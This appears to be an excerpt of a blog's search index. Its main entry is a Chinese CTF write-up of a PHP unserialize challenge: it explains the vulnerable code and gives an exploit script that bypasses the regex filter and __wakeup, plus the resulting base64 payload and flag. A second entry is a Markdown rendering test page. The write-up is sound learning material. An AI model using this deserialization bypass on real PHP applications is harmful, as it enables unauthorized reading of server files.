<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>审计代码。发现有几处函数不懂。通过查阅资料可知</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__destruct()：析构函数</span><br><span class="line">构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</span><br><span class="line">在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。</span><br><span class="line">而析构函数正是在垃圾回收机制回收对象之前调用的。</span><br><span class="line">简而言之。 destruct在最后执行。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() 在执行unserialize($var);前，会执行__wakeup()函数。因此需要绕过。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset(变量): 判读变量值是否为NULL（&quot;\0&quot;），若是，则返回false。否则返回true.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match():正则匹配模式，匹配var变量中是否有 [oc]:\d+:</span><br><span class="line">我们需要明白OC匹配模式的规则</span><br><span class="line">正则表达式：是指一个用来描述或者匹配一系列符合某个句法规则的字符串的单个字符串，简单说，就是我们写个模板，然后去匹配字符串。</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/15/Study/Web_php_unserialize/image-20220115141748577.png" alt="image-20220115141748577"></p>
<p>附匹配规则表</p>
<p>第12行可知，flag很可能在fl4g.php中<img src="/2022/01/15/Study/Web_php_unserialize/image-20220115141815743.png" alt="image-20220115141815743" style="zoom:50%;"></p>
<p>添加/fl4g.php 网页空白。<br>其实是在Demo类中，执行了wakeup()，使得file强制赋值为了index.php.</p>
<p>我们需要GET请求var值绕过preg_match和wakeup()。</p>
<p><img src="/2022/01/15/Study/Web_php_unserialize/image-20220115014622417.png" alt="image-20220115014622417"></p>
<p>我们可以利用CVE-2016漏洞跳过wakeup()</p>
<p>由于本人毫无写php的基础。因此附上网上wp的php脚本进行分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个对象,并且创建对象时，自动且先调用了__construct函数，</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);<span class="comment">//把$file赋值为&#x27;fl4g.php&#x27;</span></span><br><span class="line"><span class="comment">#进行序列化</span></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过正则表达式的检查</span></span><br><span class="line"><span class="comment">#  /[oc]:\d+:/i   意思为，在var中匹配 &quot;o(或者c或者oc):%d:&quot; 若匹配成功则不返回0.</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;O:4:&#x27;</span>,<span class="string">&#x27;O:+4:&#x27;</span>,<span class="variable">$a</span>);<span class="comment">//讲4改为+4 使得匹配不到 o:4:</span></span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过__wakeup()魔法函数</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#再进行base64编码,输出的结果为flag</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#扔到在线编译器结果为</span></span><br><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br><span class="line">   <span class="comment">#获得flag</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Test</title>
    <url>/1970/01/01/%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><p><strong>粗体</strong></p>
<p><em>斜体</em></p>
<span id="more"></span> 
<p>More 一下</p>
<p><del>删除线</del></p>
<hr>
<hr>
<blockquote>
<p>引用<br>换行</p>
<p>分段</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">表头 1</th>
<th style="text-align:center">表头 2</th>
<th style="text-align:right">表头 3</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">靠左对齐</td>
<td style="text-align:center">居中对齐</td>
<td style="text-align:right">靠右对齐</td>
</tr>
</tbody>
</table>
</div>
<p><code>inline code</code></p>
<p><code>inline code with $LaTeX$ (should not be parsed)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># A code example</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello world!&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>$Inline \: \LaTeX$</p>
<p>$一个公式:f(x,y) = 3$</p>
<p>正整数立方和求和公式：</p>
<script type="math/tex; mode=display">
\begin{aligned}
\sum_{i=1}^n i^3
&=(\sum_{i=1}^n i)^2 \\
&=\frac {n^2(n+1)^2}4 \\
\end{aligned}</script><p>欧拉函数的性质之一：</p>
<script type="math/tex; mode=display">
\begin{aligned}
    \varphi \: * \: I &= id \\
\sum_{d|n} \varphi(d) &= n \\
\end{aligned}</script><p>It was terribly cold and nearly dark on the last evening of the old year, and the snow was falling fast. In the cold and the darkness, a poor little girl, with bare head and naked feet, roamed through the streets. It is true she had on a pair of slippers when she left home, but they were not of much use. They were very large, so large, indeed, that they had belonged to her mother, and the poor little creature had lost them in running across the street to avoid two carriages that were rolling along at a terrible rate. One of the slippers she could not find, and a boy seized upon the other and ran away with it, saying that he could use it as a cradle, when he had children of his own. So the little girl went on with her little naked feet, which were quite red and blue with the cold. In an old apron she carried a number of matches, and had a bundle of them in her hands. No one had bought anything of her the whole day, nor had anyone given her even a penny. Shivering with cold and hunger, she crept along; poor little child, she looked the picture of misery. The snowflakes fell on her long, fair hair, which hung in curls on her shoulders, but she regarded them not.</p>
<p><a href="#二级标题">标题跳转</a></p>
<h3 id="往我这里跳"><a href="#往我这里跳" class="headerlink" title="往我这里跳"></a>往我这里跳</h3><p><a href="#往我这里跳">标题跳转</a></p>
]]></content>
      <categories>
        <category>测试</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
</search>
